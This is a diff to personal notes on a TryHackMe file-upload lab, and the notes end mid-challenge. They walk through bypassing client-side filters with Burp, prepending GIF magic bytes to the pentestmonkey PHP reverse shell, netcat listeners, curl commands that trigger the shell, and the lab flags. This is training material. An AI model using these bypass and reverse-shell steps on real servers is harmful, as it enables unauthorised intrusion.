@@ -176,9 +176,9 @@
 >		}
 >	});
 >};
-4. Set up [Burpsuite](https://tryhackme.com/resources/blog/setting-up-burp) to be able to capture traffic. After setting it up, reload http://java.uploadvulns.thm and the traffic should be displayed in the Proxy > Intercept tab. The webpage should appear to be loading indefinitely
+4. Set up [Burpsuite](https://tryhackme.com/resources/blog/setting-up-burp) to be able to capture traffic. After setting it up, reload http://java.uploadvulns.thm and the traffic should be displayed in the Proxy > Intercept tab. The webpage should appear to be loading indefinitely. Right click > Do Intercept > Response to this request, and you'll be able to see the html code that the server sent us
 5. Delete the script tag that links the 'client-side-filter.js' to the html
-6. Right click > Do Intercept > Response to this request. Then click Forward until the webpage finishes loading
+6. Click Forward until the webpage finishes loading
 7. Now prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it to the server. There should be no error because we removed the filtering restrictions
 8. Set up netcat with the port specified in the script `nc -nvlp 6000`
 9. Execute the script with curl
@@ -226,3 +226,98 @@
 5. Set up netcat listener on the port specified in script `nc -nvlp 6000`
 6. Use curl to execute the file on the server `curl http://annex.uploadvulns.thm/privacy/2021-11-29-05-54-08-php-reverse-shell.php5`
 7. Once you have a shell, use `cat /var/www/flag.txt` to get THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
+
+
+## Bypassing Server Side Filtering: Magic Numbers
+- Magic numbers are more accurate than extensions and are a string of hex digits that are placed at the beginning of a file
+- Some filters use magic numbers to validate file uploads by comparing the first hex digits of a file to a whitelist/blacklist
+- List of [magic numbers](https://en.wikipedia.org/wiki/List_of_file_signatures)
+- When trying to disguise a file as another file with magic numbers:
+    1. Find the magic numbers of the file that you're trying to spoof as
+    2. Open the file in a hex editor. I've found that [ghex](https://wiki.gnome.org/Apps/Ghex) is really easy to use
+    3. Insert the magic numbers into the beginning of the file and save
+### Exercise
+1. Use gobuster to enumerate `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://magic.uploadvulns.thm`. We see that /graphics is forbidden (status 301) but we can assume that our uploaded files will be stored there
+>root@ip-10-10-19-149:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://magic.uploadvulns.thm
+>===============================================================
+>Gobuster v3.0.1
+>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+>===============================================================
+>[+] Url:            http://magic.uploadvulns.thm
+>[+] Threads:        10
+>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+>[+] Status codes:   200,204,301,302,307,401,403
+>[+] User Agent:     gobuster/3.0.1
+>[+] Timeout:        10s
+>===============================================================
+>2021/11/30 02:07:28 Starting gobuster
+>===============================================================
+>/.htaccess (Status: 403)
+>/.htpasswd (Status: 403)
+>/.hta (Status: 403)
+>/assets (Status: 301)
+>/favicon.ico (Status: 200)
+>/graphics (Status: 301)
+>/index.php (Status: 200)
+>/server-status (Status: 403)
+>===============================================================
+>2021/11/30 02:07:31 Finished
+>===============================================================
+2. Prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and try to upload it. We get an error that says that only gif files are allowed
+3. Go to [magic numbers](https://en.wikipedia.org/wiki/List_of_file_signatures) and find the magic numbers for gif files. We find 2 magic numbers, but we'll just use the first one for GIF87a, which is `47 49 46 38 37 61`
+4. Open the reverse shell script with a hex editor (I used [ghex](https://wiki.gnome.org/Apps/Ghex)) and insert the magic number into the beginning of the file
+    - Note: For ghex you have to Edit > Check Insert Mode to be able to insert
+5. Now try to upload and it'll work
+6. Set up netcat listener with the port set in the reverse shell script: `nc -nvlp 6000`
+7. If we try to access the /graphics directory we get a forbidden error, so we access the file directly (hoping that the server didn't change the name of the file) with `curl http://magic.uploadvulns.thm/graphics/php-reverse-shell.php`
+8. Find the flag `cat /var/www/flag.txt`, THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}
+
+
+## Example Methodology
+- I'm going to paste the exact paragraph from tryhackme because I know I'm going to refer back to it later on
+>We've seen various different types of filter now -- both client side and server side -- as well as the general methodology for file upload attacks. In the next task you're going to be given a black-box file upload challenge to complete, so let's take the opportunity to discuss an example methodology for approaching this kind of challenge in a little more depth. You may develop your own alternative to this method, however, if you're new to this kind of attack, you may find the following information useful.
+>
+>We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.
+>
+>The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
+>Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
+>We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
+>An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
+>Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.
+>Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:
+>
+>If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
+>Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
+>As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
+>Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.
+>You should now be well equipped to take on the challenge in task eleven.
+
+
+## Challenge
+1. Use gobuster to enumerate: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://jewel.uploadvulns.thm/`. We find that the only ones we can access are /admin, /Admin, and /ADMIN. All three lead to the same directory, and we see that the admin page states, "As a reminder: use this form to activate modules from the /modules directory." We can assume that files we upload will go to the /modules directory, and after we upload the reverse shell we can activate it from this page. There seems to be a 25 character limit to the input in the admin page `<input type=text name=cmd placeholder="Enter file to execute" maxlength=25>`, so make sure to keep the names+extensions of files below 25
+>root@ip-10-10-94-8:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://jewel.uploadvulns.thm/
+>===============================================================
+>Gobuster v3.0.1
+>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+>===============================================================
+>[+] Url:            http://jewel.uploadvulns.thm/
+>[+] Threads:        10
+>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+>[+] Status codes:   200,204,301,302,307,401,403
+>[+] User Agent:     gobuster/3.0.1
+>[+] Timeout:        10s
+>===============================================================
+>2021/11/30 06:23:16 Starting gobuster
+>===============================================================
+>/admin (Status: 200)
+>/Admin (Status: 200)
+>/ADMIN (Status: 200)
+>/assets (Status: 301)
+>/content (Status: 301)
+>/Content (Status: 301)
+>/modules (Status: 301)
+>===============================================================
+>2021/11/30 06:23:22 Finished
+>===============================================================
+2. Look at the page source for the landing page and we see that the input accepts files with MIME type of "image/jpeg" `<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">`. Since this is client side filtering, we can use burpsuite to circumvent if necessary
+3. Now that we know that the client side filter only accepts jpg, we can try to pass it by removing the restriction with burpsuite. Follow the same procedure as when we used burpsuite to bypass client side filtering
